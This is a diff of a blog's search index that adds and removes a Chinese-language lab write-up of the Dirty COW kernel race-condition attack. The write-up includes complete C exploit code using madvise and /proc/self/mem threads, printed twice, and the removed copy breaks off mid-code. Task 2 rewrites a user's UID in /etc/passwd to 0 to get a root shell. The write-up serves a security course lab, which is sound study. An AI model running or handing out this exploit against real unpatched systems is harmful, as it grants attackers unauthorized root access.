       </categories>
       <tags>
         <tag>Python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Dirty_COW_Attack_Lab</title>
+    <url>/posts/4a597bff.html</url>
+    <content><![CDATA[<h1 id="实验目的"><a class="markdownIt-Anchor" href="#实验目的"></a> 实验目的</h1>
+<p>  1、获得 Dirty COW 攻击的实践经验。</p>
+<p>  2、了解攻击所利用的竞争条件漏洞。</p>
+<p>  3、更深入地了解一般竞争条件安全问题。</p>
+<h1 id="实验原理"><a class="markdownIt-Anchor" href="#实验原理"></a> 实验原理</h1>
+<p>  利用 Dirty COW 竞争条件漏洞获得 root 权限。</p>
+<h1 id="实验环境"><a class="markdownIt-Anchor" href="#实验环境"></a> 实验环境</h1>
+<p>  Ubuntu 12.04 虚拟机。</p>
+<h1 id="实验任务"><a class="markdownIt-Anchor" href="#实验任务"></a> 实验任务</h1>
+<h2 id="task1"><a class="markdownIt-Anchor" href="#task1"></a> Task1</h2>
+<h3 id="创建虚拟只读文件"><a class="markdownIt-Anchor" href="#创建虚拟只读文件"></a> 创建虚拟只读文件</h3>
+<p>  步骤：</p>
+<p>  1、sudo touch /zzz指令在根目录下创建一个名为 zzz 的空文件。</p>
+<p>  2、sudo chmod 644 /zzz指令将 zzz 文件的权限设置为 644，即如果未获得根目录权限则对 zzz 文件的权限为只读。</p>
+<p>  3、sudo gedit /zzz指令用 gedit 编辑器打开 zzz 文件。</p>
+<p>  4、在 gedit 编辑器中输入&quot;SuperYzsisagoodman.&quot;，保存并关闭。</p>
+<p>  5、ls -l /zzz指令查看 zzz 文件的权限，显示为-rw-r--r--，即文件所有者的权限为读写，同组用户和其他用户的权限为只读。</p>
+<p>  6、echo 99999 &gt; /zzz 指令将 99999 写入 zzz 文件，显示为Permission denied，即无权限。</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Dirty-COW-Attack-Lab/1.1.png" alt="创建虚拟只读文件" /></p>
+<h3 id="发起攻击"><a class="markdownIt-Anchor" href="#发起攻击"></a> 发起攻击</h3>
+<p>  步骤：</p>
+<p>  1、gedit cow_attack.c 创建一个名为 cow_attack.c 的 C 语言文件并使用 gedit 编辑器打开，编写攻击代码：</p>
+<p>  main 线程将/zzz 映射到内存中，找到序列&quot;SuperYzs&quot;的位置，然后创建两个线程来利用操作系统内核中的 Dirty COW 竞争条件漏洞。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">pthread_t</span> pth1,pth2;</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">   <span class="type">int</span> file_size;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Open the target file in the read-only mode.</span></span><br><span class="line">   <span class="type">int</span> f=open(<span class="string">&quot;/zzz&quot;</span>, O_RDONLY);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Map the file to COW memory using MAP_PRIVATE.</span></span><br><span class="line">   fstat(f, &amp;st);</span><br><span class="line">   file_size = st.st_size;</span><br><span class="line">   <span class="built_in">map</span>=mmap(<span class="literal">NULL</span>, file_size, PROT_READ, MAP_PRIVATE, f, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Find the position of the target area</span></span><br><span class="line">   <span class="type">char</span> *position = <span class="built_in">strstr</span>(<span class="built_in">map</span>, <span class="string">&quot;SuperYzs&quot;</span>);                        </span><br><span class="line"></span><br><span class="line">   <span class="comment">// We have to do the attack using two threads.</span></span><br><span class="line">   pthread_create(&amp;pth1, <span class="literal">NULL</span>, madviseThread, (<span class="type">void</span>  *)file_size); </span><br><span class="line">   pthread_create(&amp;pth2, <span class="literal">NULL</span>, writeThread, position);             </span><br><span class="line"></span><br><span class="line">   <span class="comment">// Wait for the threads to finish.</span></span><br><span class="line">   pthread_join(pth1, <span class="literal">NULL</span>);</span><br><span class="line">   pthread_join(pth2, <span class="literal">NULL</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>  下面 write 线程的任务是将内存中的字符串&quot;SuperYzs&quot;替换为&quot;********&quot;。由于映射的内存是 COW 类型，只有这个线程时仅能修改映射内存的副本，不会对底层的/zzz 文件进行任何更改。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">writeThread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">char</span> *content= <span class="string">&quot;********&quot;</span>;</span><br><span class="line">   <span class="type">off_t</span> offset = (<span class="type">off_t</span>) arg;</span><br><span class="line"></span><br><span class="line">   <span class="type">int</span> f=open(<span class="string">&quot;/proc/self/mem&quot;</span>, O_RDWR);</span><br><span class="line">   <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="comment">// Move the file pointer to the corresponding position.</span></span><br><span class="line">      lseek(f, offset, SEEK_SET);</span><br><span class="line">      <span class="comment">// Write to the memory.</span></span><br><span class="line">      write(f, content, <span class="built_in">strlen</span>(content));</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>  madvise 线程只执行一项任务：丢弃映射内存的私有副本，以便页表可以重新指向原始映射内存。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">madviseThread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">int</span> file_size = (<span class="type">int</span>) arg;</span><br><span class="line">   <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">      madvise(<span class="built_in">map</span>, file_size, MADV_DONTNEED);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>  2、gcc cow_attack.c -lpthread 指令使用多线程编译指令-lpthread编译 cow_attack.c 文件，使用 ls 指令发现生成了a.out文件。</p>
+<p>  3、./a.out 指令运行 a.out 文件，等待一顿时间后退出程序。</p>
+<p>  4、cat /zzz 指令查看 zzz 文件，发现文件内容已经被修改 &quot;********isagoodman&quot;，即&quot;SuperYzs已被替换为&quot;********&quot;，攻击成功。</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Dirty-COW-Attack-Lab/1.2.png" alt="攻击步骤" /></p>
+<h2 id="task-2-修改口令文件以获取-root-权限"><a class="markdownIt-Anchor" href="#task-2-修改口令文件以获取-root-权限"></a> Task 2: 修改口令文件以获取 Root 权限</h2>
+<p>  步骤：</p>
+<p>  1、使用sudo adduser charlie指令创建一个名为 charlie 的用户。</p>
+<p>  2、使用cat /etc/passwd | grep charlie查看charlie的记录。</p>
+<p>  3、使用gedit cow_attack.c 指令将cow_attack.c文件使用 gedit 编辑器打开，修改代码达到攻击目的：即找到/etc/passwd文件中的charlie记录，将其第三个字段改为0，注意改完之后的字段总长度与之前相同，不足的部分使用&quot;,&quot;补齐。</p>
+<p>  4、使用gcc cow_attack.c -lpthread指令编译 cow_attack.c 文件，使用./a.out指令运行 a.out 文件，等待一顿时间后退出程序。</p>
+<p>  5、再次使用cat /etc/passwd | grep charlie查看charlie的记录，发现第三个字符已经改为0了，即charlie已经具有了root权限。</p>
+<p>  6、使用su charlie 切换到 charlie 用户，在 shell 提示符处看到 # 符号，这是 rootshell 的指示符。运行 id 命令，发现已经获得了 root 权限，攻击成功。</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Dirty-COW-Attack-Lab/2.1.png" alt="创建charlie用户" /></p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Dirty-COW-Attack-Lab/2.2.png" alt="Dirty COW 攻击" /></p>
+<h1 id="思考题"><a class="markdownIt-Anchor" href="#思考题"></a> 思考题</h1>
+<h2 id="q1"><a class="markdownIt-Anchor" href="#q1"></a> Q1</h2>
+<p>  会打印出字符串&quot;World&quot;。 当这个文件使用 mmap() 映射到内存（整个文件）时，每个字符都会被存储在连续的内存地址中，内存地址被存储在一个变量map 中，其中map指向映射内存的起始地址，也就是字符串&quot;Hello World&quot;的'H'的地址。map + 6则是指向'W'的地址，因此printf(&quot;%s\n&quot;, map + 6)；将从地址map + 6开始打印，直到遇到一个null字符（字符串结束标志），因此会打印出字符串&quot;World&quot;。</p>
+<h2 id="q2"><a class="markdownIt-Anchor" href="#q2"></a> Q2</h2>
+<p>  不可以。因为线程共享相同的地址空间，因此可以更容易地制造出Dirty-Cow攻击的必要条件；而进程则拥有独立的内存空间，使得攻击难以进行。</p>
+<h1 id="代码附录"><a class="markdownIt-Anchor" href="#代码附录"></a> 代码附录</h1>
+<h2 id="task1-2"><a class="markdownIt-Anchor" href="#task1-2"></a> Task1</h2>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="built_in">map</span>;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">writeThread</span><span class="params">(<span class="type">void</span> *arg)</span>;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">madviseThread</span><span class="params">(<span class="type">void</span> *arg)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">pthread_t</span> pth1,pth2;</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">   <span class="type">int</span> file_size;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Open the target file in the read-only mode.</span></span><br><span class="line">   <span class="type">int</span> f=open(<span class="string">&quot;/zzz&quot;</span>, O_RDONLY);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Map the file to COW memory using MAP_PRIVATE.</span></span><br><span class="line">   fstat(f, &amp;st);</span><br><span class="line">   file_size = st.st_size;</span><br><span class="line">   <span class="built_in">map</span>=mmap(<span class="literal">NULL</span>, file_size, PROT_READ, MAP_PRIVATE, f, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Find the position of the target area</span></span><br><span class="line">   <span class="type">char</span> *position = <span class="built_in">strstr</span>(<span class="built_in">map</span>, <span class="string">&quot;SuperYzs&quot;</span>);                        </span><br><span class="line"></span><br><span class="line">   <span class="comment">// We have to do the attack using two threads.</span></span><br><span class="line">   pthread_create(&amp;pth1, <span class="literal">NULL</span>, madviseThread, (<span class="type">void</span>  *)file_size); </span><br><span class="line">   pthread_create(&amp;pth2, <span class="literal">NULL</span>, writeThread, position);             </span><br><span class="line"></span><br><span class="line">   <span class="comment">// Wait for the threads to finish.</span></span><br><span class="line">   pthread_join(pth1, <span class="literal">NULL</span>);</span><br><span class="line">   pthread_join(pth2, <span class="literal">NULL</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">writeThread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">char</span> *content= <span class="string">&quot;********&quot;</span>;</span><br><span class="line">   <span class="type">off_t</span> offset = (<span class="type">off_t</span>) arg;</span><br><span class="line"></span><br><span class="line">   <span class="type">int</span> f=open(<span class="string">&quot;/proc/self/mem&quot;</span>, O_RDWR);</span><br><span class="line">   <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="comment">// Move the file pointer to the corresponding position.</span></span><br><span class="line">      lseek(f, offset, SEEK_SET);</span><br><span class="line">      <span class="comment">// Write to the memory.</span></span><br><span class="line">      write(f, content, <span class="built_in">strlen</span>(content));</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">madviseThread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">int</span> file_size = (<span class="type">int</span>) arg;</span><br><span class="line">   <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">      madvise(<span class="built_in">map</span>, file_size, MADV_DONTNEED);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="task2"><a class="markdownIt-Anchor" href="#task2"></a> Task2</h2>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="built_in">map</span>;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">writeThread</span><span class="params">(<span class="type">void</span> *arg)</span>;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">madviseThread</span><span class="params">(<span class="type">void</span> *arg)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">pthread_t</span> pth1,pth2;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">  <span class="type">int</span> file_size;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Open the target file in the read-only mode.</span></span><br><span class="line">  <span class="type">int</span> f=open(<span class="string">&quot;/etc/passwd&quot;</span>, O_RDONLY);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Map the file to COW memory using MAP_PRIVATE.</span></span><br><span class="line">  fstat(f, &amp;st);</span><br><span class="line">  file_size = st.st_size;</span><br><span class="line">  <span class="built_in">map</span>=mmap(<span class="literal">NULL</span>, file_size, PROT_READ, MAP_PRIVATE, f, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Find the position of the target area</span></span><br><span class="line">  <span class="type">char</span> *position = <span class="built_in">strstr</span>(<span class="built_in">map</span>, <span class="string">&quot;charlie&quot;</span>);                        </span><br><span class="line"></span><br><span class="line">  <span class="comment">// We have to do the attack using two threads.</span></span><br><span class="line">  pthread_create(&amp;pth1, <span class="literal">NULL</span>, madviseThread, (<span class="type">void</span>  *)file_size); </span><br><span class="line">  pthread_create(&amp;pth2, <span class="literal">NULL</span>, writeThread, position);             </span><br><span class="line"></span><br><span class="line">  <span class="comment">// Wait for the threads to finish.</span></span><br><span class="line">  pthread_join(pth1, <span class="literal">NULL</span>);</span><br><span class="line">  pthread_join(pth2, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">writeThread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;   </span><br><span class="line">  <span class="type">char</span> *content=<span class="string">&quot;charlie:x:0:1002:,,,,,,,:/home/charlie:/bin/bash&quot;</span> ;</span><br><span class="line">  <span class="type">off_t</span> offset = (<span class="type">off_t</span>) arg;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> f=open(<span class="string">&quot;/proc/self/mem&quot;</span>, O_RDWR);</span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="comment">// Move the file pointer to the corresponding position.</span></span><br><span class="line">    lseek(f, offset, SEEK_SET);</span><br><span class="line">    <span class="comment">// Write to the memory.</span></span><br><span class="line">    write(f, content, <span class="built_in">strlen</span>(content));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">madviseThread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> file_size = (<span class="type">int</span>) arg;</span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">      madvise(<span class="built_in">map</span>, file_size, MADV_DONTNEED);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>逆向工程与汇编语言</category>
+      </categories>
+      <tags>
+        <tag>C</tag>
       </tags>
   </entry>
   <entry>
@@ -809,218 +871,6 @@ main:
 <p>节头部字符串表在节头部表中的索引（Section header string table index）：0a00：表示节头部字符串表在节头部表中的索引为 10。</p>
 <p>之后的内容不属于 ELF 头部字段，而是程序的机器码和其他信息。</p>
 <p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-1/4.1.png" alt="输出结果" /></p>
-]]></content>
-      <categories>
-        <category>逆向工程与汇编语言</category>
-      </categories>
-      <tags>
-        <tag>C</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Dirty_COW_Attack_Lab</title>
-    <url>/posts/4a597bff.html</url>
-    <content><![CDATA[<h1 id="实验目的"><a class="markdownIt-Anchor" href="#实验目的"></a> 实验目的</h1>
-<p>  1、获得 Dirty COW 攻击的实践经验。</p>
-<p>  2、了解攻击所利用的竞争条件漏洞。</p>
-<p>  3、更深入地了解一般竞争条件安全问题。</p>
-<h1 id="实验原理"><a class="markdownIt-Anchor" href="#实验原理"></a> 实验原理</h1>
-<p>  利用 Dirty COW 竞争条件漏洞获得 root 权限。</p>
-<h1 id="实验环境"><a class="markdownIt-Anchor" href="#实验环境"></a> 实验环境</h1>
-<p>  Ubuntu 12.04 虚拟机。</p>
-<h1 id="实验任务"><a class="markdownIt-Anchor" href="#实验任务"></a> 实验任务</h1>
-<h2 id="task1"><a class="markdownIt-Anchor" href="#task1"></a> Task1</h2>
-<h3 id="创建虚拟只读文件"><a class="markdownIt-Anchor" href="#创建虚拟只读文件"></a> 创建虚拟只读文件</h3>
-<p>  步骤：</p>
-<p>  1、sudo touch /zzz指令在根目录下创建一个名为 zzz 的空文件。</p>
-<p>  2、sudo chmod 644 /zzz指令将 zzz 文件的权限设置为 644，即如果未获得根目录权限则对 zzz 文件的权限为只读。</p>
-<p>  3、sudo gedit /zzz指令用 gedit 编辑器打开 zzz 文件。</p>
-<p>  4、在 gedit 编辑器中输入&quot;SuperYzsisagoodman.&quot;，保存并关闭。</p>
-<p>  5、ls -l /zzz指令查看 zzz 文件的权限，显示为-rw-r--r--，即文件所有者的权限为读写，同组用户和其他用户的权限为只读。</p>
-<p>  6、echo 99999 &gt; /zzz 指令将 99999 写入 zzz 文件，显示为Permission denied，即无权限。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Dirty-COW-Attack-Lab/1.1.png" alt="创建虚拟只读文件" /></p>
-<h3 id="发起攻击"><a class="markdownIt-Anchor" href="#发起攻击"></a> 发起攻击</h3>
-<p>  步骤：</p>
-<p>  1、gedit cow_attack.c 创建一个名为 cow_attack.c 的 C 语言文件并使用 gedit 编辑器打开，编写攻击代码：</p>
-<p>  main 线程将/zzz 映射到内存中，找到序列&quot;SuperYzs&quot;的位置，然后创建两个线程来利用操作系统内核中的 Dirty COW 竞争条件漏洞。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">pthread_t</span> pth1,pth2;</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">   <span class="type">int</span> file_size;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Open the target file in the read-only mode.</span></span><br><span class="line">   <span class="type">int</span> f=open(<span class="string">&quot;/zzz&quot;</span>, O_RDONLY);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Map the file to COW memory using MAP_PRIVATE.</span></span><br><span class="line">   fstat(f, &amp;st);</span><br><span class="line">   file_size = st.st_size;</span><br><span class="line">   <span class="built_in">map</span>=mmap(<span class="literal">NULL</span>, file_size, PROT_READ, MAP_PRIVATE, f, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Find the position of the target area</span></span><br><span class="line">   <span class="type">char</span> *position = <span class="built_in">strstr</span>(<span class="built_in">map</span>, <span class="string">&quot;SuperYzs&quot;</span>);                        </span><br><span class="line"></span><br><span class="line">   <span class="comment">// We have to do the attack using two threads.</span></span><br><span class="line">   pthread_create(&amp;pth1, <span class="literal">NULL</span>, madviseThread, (<span class="type">void</span>  *)file_size); </span><br><span class="line">   pthread_create(&amp;pth2, <span class="literal">NULL</span>, writeThread, position);             </span><br><span class="line"></span><br><span class="line">   <span class="comment">// Wait for the threads to finish.</span></span><br><span class="line">   pthread_join(pth1, <span class="literal">NULL</span>);</span><br><span class="line">   pthread_join(pth2, <span class="literal">NULL</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>  下面 write 线程的任务是将内存中的字符串&quot;SuperYzs&quot;替换为&quot;********&quot;。由于映射的内存是 COW 类型，只有这个线程时仅能修改映射内存的副本，不会对底层的/zzz 文件进行任何更改。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">writeThread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">char</span> *content= <span class="string">&quot;********&quot;</span>;</span><br><span class="line">   <span class="type">off_t</span> offset = (<span class="type">off_t</span>) arg;</span><br><span class="line"></span><br><span class="line">   <span class="type">int</span> f=open(<span class="string">&quot;/proc/self/mem&quot;</span>, O_RDWR);</span><br><span class="line">   <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="comment">// Move the file pointer to the corresponding position.</span></span><br><span class="line">      lseek(f, offset, SEEK_SET);</span><br><span class="line">      <span class="comment">// Write to the memory.</span></span><br><span class="line">      write(f, content, <span class="built_in">strlen</span>(content));</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>  madvise 线程只执行一项任务：丢弃映射内存的私有副本，以便页表可以重新指向原始映射内存。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">madviseThread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">int</span> file_size = (<span class="type">int</span>) arg;</span><br><span class="line">   <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">      madvise(<span class="built_in">map</span>, file_size, MADV_DONTNEED);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>  2、gcc cow_attack.c -lpthread 指令使用多线程编译指令-lpthread编译 cow_attack.c 文件，使用 ls 指令发现生成了a.out文件。</p>
-<p>  3、./a.out 指令运行 a.out 文件，等待一顿时间后退出程序。</p>
-<p>  4、cat /zzz 指令查看 zzz 文件，发现文件内容已经被修改 &quot;********isagoodman&quot;，即&quot;SuperYzs已被替换为&quot;********&quot;，攻击成功。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Dirty-COW-Attack-Lab/1.2.png" alt="攻击步骤" /></p>
-<h2 id="task-2-修改口令文件以获取-root-权限"><a class="markdownIt-Anchor" href="#task-2-修改口令文件以获取-root-权限"></a> Task 2: 修改口令文件以获取 Root 权限</h2>
-<p>  步骤：</p>
-<p>  1、使用sudo adduser charlie指令创建一个名为 charlie 的用户。</p>
-<p>  2、使用cat /etc/passwd | grep charlie查看charlie的记录。</p>
-<p>  3、使用gedit cow_attack.c 指令将cow_attack.c文件使用 gedit 编辑器打开，修改代码达到攻击目的：即找到/etc/passwd文件中的charlie记录，将其第三个字段改为0，注意改完之后的字段总长度与之前相同，不足的部分使用&quot;,&quot;补齐。</p>
-<p>  4、使用gcc cow_attack.c -lpthread指令编译 cow_attack.c 文件，使用./a.out指令运行 a.out 文件，等待一顿时间后退出程序。</p>
-<p>  5、再次使用cat /etc/passwd | grep charlie查看charlie的记录，发现第三个字符已经改为0了，即charlie已经具有了root权限。</p>
-<p>  6、使用su charlie 切换到 charlie 用户，在 shell 提示符处看到 # 符号，这是 rootshell 的指示符。运行 id 命令，发现已经获得了 root 权限，攻击成功。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Dirty-COW-Attack-Lab/2.1.png" alt="创建charlie用户" /></p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Dirty-COW-Attack-Lab/2.2.png" alt="Dirty COW 攻击" /></p>
-<h1 id="思考题"><a class="markdownIt-Anchor" href="#思考题"></a> 思考题</h1>
-<h2 id="q1"><a class="markdownIt-Anchor" href="#q1"></a> Q1</h2>
-<p>  会打印出字符串&quot;World&quot;。 当这个文件使用 mmap() 映射到内存（整个文件）时，每个字符都会被存储在连续的内存地址中，内存地址被存储在一个变量map 中，其中map指向映射内存的起始地址，也就是字符串&quot;Hello World&quot;的'H'的地址。map + 6则是指向'W'的地址，因此printf(&quot;%s\n&quot;, map + 6)；将从地址map + 6开始打印，直到遇到一个null字符（字符串结束标志），因此会打印出字符串&quot;World&quot;。</p>
-<h2 id="q2"><a class="markdownIt-Anchor" href="#q2"></a> Q2</h2>
-<p>  不可以。因为线程共享相同的地址空间，因此可以更容易地制造出Dirty-Cow攻击的必要条件；而进程则拥有独立的内存空间，使得攻击难以进行。</p>
-<h1 id="代码附录"><a class="markdownIt-Anchor" href="#代码附录"></a> 代码附录</h1>
-<h2 id="task1-2"><a class="markdownIt-Anchor" href="#task1-2"></a> Task1</h2>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="built_in">map</span>;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">writeThread</span><span class="params">(<span class="type">void</span> *arg)</span>;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">madviseThread</span><span class="params">(<span class="type">void</span> *arg)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">pthread_t</span> pth1,pth2;</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">   <span class="type">int</span> file_size;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Open the target file in the read-only mode.</span></span><br><span class="line">   <span class="type">int</span> f=open(<span class="string">&quot;/zzz&quot;</span>, O_RDONLY);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Map the file to COW memory using MAP_PRIVATE.</span></span><br><span class="line">   fstat(f, &amp;st);</span><br><span class="line">   file_size = st.st_size;</span><br><span class="line">   <span class="built_in">map</span>=mmap(<span class="literal">NULL</span>, file_size, PROT_READ, MAP_PRIVATE, f, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Find the position of the target area</span></span><br><span class="line">   <span class="type">char</span> *position = <span class="built_in">strstr</span>(<span class="built_in">map</span>, <span class="string">&quot;SuperYzs&quot;</span>);                        </span><br><span class="line"></span><br><span class="line">   <span class="comment">// We have to do the attack using two threads.</span></span><br><span class="line">   pthread_create(&amp;pth1, <span class="literal">NULL</span>, madviseThread, (<span class="type">void</span>  *)file_size); </span><br><span class="line">   pthread_create(&amp;pth2, <span class="literal">NULL</span>, writeThread, position);             </span><br><span class="line"></span><br><span class="line">   <span class="comment">// Wait for the threads to finish.</span></span><br><span class="line">   pthread_join(pth1, <span class="literal">NULL</span>);</span><br><span class="line">   pthread_join(pth2, <span class="literal">NULL</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">writeThread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">char</span> *content= <span 